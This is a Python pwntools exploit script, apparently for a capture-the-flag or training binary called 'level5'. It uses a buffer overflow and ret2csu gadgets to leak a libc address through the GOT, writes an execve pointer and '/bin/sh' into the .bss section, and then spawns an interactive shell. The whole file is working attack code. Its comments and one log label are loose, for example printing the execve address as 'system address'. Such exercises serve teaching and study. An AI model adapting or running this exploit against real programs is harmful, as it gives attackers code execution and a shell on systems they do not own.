from pwn import *

context.arch = "amd64"

r = process("./level5")
elf = ELF("./level5")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

read_got = elf.got['read']
write_got = elf.got['write']
bss_base = elf.bss()
main_addr = elf.sym.main

csu_gadget1 = 0x400600
csu_gedget2 = 0x40061A

def ret2csu(rbx, rbp, r12, r13, r14, r15, backto):
    # we will use two parts csu gadget
    p = flat('a' * 0x88,
            csu_gedget2,
            rbx, rbp, r12, r13, r14, r15,
            csu_gadget1,
            'a' * 0x38,    # junk data
            backto)
    r.sendline(p)
    sleep(1)

r.recvline()

# call qword ptr [r12 + rbx*8]
# overwrite r12 with the address of write_got
# write(1, write_got, 8)
ret2csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(r.recv(8))
write_off = libc.sym.write
libc.address = write_addr - write_off
success( 'libc base address => %s' % hex(libc.address) )
success( 'system address => %s' % hex(libc.sym.execve) )

#pause()

r.recvline()

# read(0, bss_base, 16)
ret2csu(0, 1, read_got, 16, bss_base, 0, main_addr)
r.send(p64(libc.sym.execve) + '/bin/sh\x00')

r.recvline()

# system(/bin/sh)
ret2csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)

#pause()

r.interactive()
